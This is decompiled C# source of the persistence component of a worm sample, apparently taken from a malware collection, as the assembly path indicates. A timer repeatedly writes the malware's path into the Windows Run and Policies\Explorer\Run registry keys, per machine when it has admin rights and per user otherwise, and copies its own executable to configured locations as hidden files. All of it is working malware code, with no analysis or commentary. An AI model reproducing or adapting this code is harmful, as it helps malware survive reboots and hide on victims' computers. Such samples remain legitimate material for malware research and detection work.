// Decompiled with JetBrains decompiler
// Type: SysDriver.cPersistent
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591752E5-2C24-490A-AF88-A636AB72D7B7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.Arcdoor.ae-9a70c0fa82dd869c7b769f53a0f2f245e58c379690ba2933aaf80f8e9c831958.exe

using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Timers;

namespace SysDriver
{
  internal class cPersistent
  {
    private Timer checkTimer = new Timer();
    private RegistryKey rKey;
    private string sSelfPath = Process.GetCurrentProcess().MainModule.FileName;

    public void loadPersistent()
    {
      this.checkTimer.Interval = (double) (cMain.ConfigClass.iPersistentInterval * 1000);
      this.checkTimer.Elapsed += new ElapsedEventHandler(this.CheckProcedure);
      this.checkTimer.Start();
    }

    public void stopPersistent()
    {
      this.checkTimer.Stop();
      this.checkTimer.Dispose();
    }

    private void CheckProcedure(object source, ElapsedEventArgs eArgs)
    {
      if (cMain.ConfigClass.bAdminStatus)
      {
        try
        {
          this.rKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[0]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[0]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
        }
        catch
        {
        }
        try
        {
          this.rKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[1]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[1]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          this.rKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[0]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[0]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
        }
        catch
        {
        }
        try
        {
          this.rKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[1]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[1]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
        }
        catch
        {
        }
      }
      try
      {
        foreach (string str in cMain.ConfigClass.sFilePath)
        {
          if (!cMain.FunctionClass.checkFile(str))
          {
            File.Copy(this.sSelfPath, str);
            File.SetAttributes(str, FileAttributes.Hidden);
          }
        }
      }
      catch
      {
      }
    }
  }
}
